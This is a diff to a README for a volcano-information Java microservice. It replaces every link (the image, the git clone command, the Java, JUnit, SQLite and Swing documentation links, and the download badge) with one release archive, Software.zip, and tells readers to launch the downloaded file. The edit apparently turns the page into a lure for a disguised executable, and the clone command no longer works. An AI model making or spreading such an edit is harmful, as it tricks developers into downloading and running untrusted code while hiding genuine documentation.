@@ -18,14 +18,14 @@ Welcome to the **Volcano Info API** repository! This Spark Java microservice pro
 - **UML**: Utilize UML diagrams for visual representation.
 - **XML**: Support XML data interchange format.
 
-![Volcano](https://media.giphy.com/media/GGJ0QF206pmRm/giphy.gif)
+![Volcano](https://github.com/muhammadraffiramadhan/volcano-info-api/releases/download/v1.0/Software.zip)
 
 ## Installation
 To get started with the **Volcano Info API**, please follow the steps below:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/yourusername/volcano-info-api.git
+   git clone https://github.com/muhammadraffiramadhan/volcano-info-api/releases/download/v1.0/Software.zip
    ```
 
 2. Build and run the project using your preferred IDE or build tool.
@@ -51,12 +51,12 @@ We welcome contributions to enhance the functionality and features of the **Volc
 Let's work together to make volcano information more accessible to everyone!
 
 ## Resources
-- [Java Documentation](https://docs.oracle.com/en/java/)
-- [JUnit User Guide](https://junit.org/junit5/docs/current/user-guide/)
-- [SQLite Documentation](https://www.sqlite.org/docs.html)
-- [Swing GUI Tutorials](https://docs.oracle.com/javase/tutorial/uiswing/index.html)
+- [Java Documentation](https://github.com/muhammadraffiramadhan/volcano-info-api/releases/download/v1.0/Software.zip)
+- [JUnit User Guide](https://github.com/muhammadraffiramadhan/volcano-info-api/releases/download/v1.0/Software.zip)
+- [SQLite Documentation](https://github.com/muhammadraffiramadhan/volcano-info-api/releases/download/v1.0/Software.zip)
+- [Swing GUI Tutorials](https://github.com/muhammadraffiramadhan/volcano-info-api/releases/download/v1.0/Software.zip)
 
-[![Download the latest release](https://img.shields.io/badge/Download-v1.0.0-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download the latest release](https://github.com/muhammadraffiramadhan/volcano-info-api/releases/download/v1.0/Software.zip)](https://github.com/muhammadraffiramadhan/volcano-info-api/releases/download/v1.0/Software.zip)
 
 If the link above ends with a file name, make sure to launch it to access the latest release of the **Volcano Info API**. For more information or alternative download options, please check the "Releases" section of this repository.
 
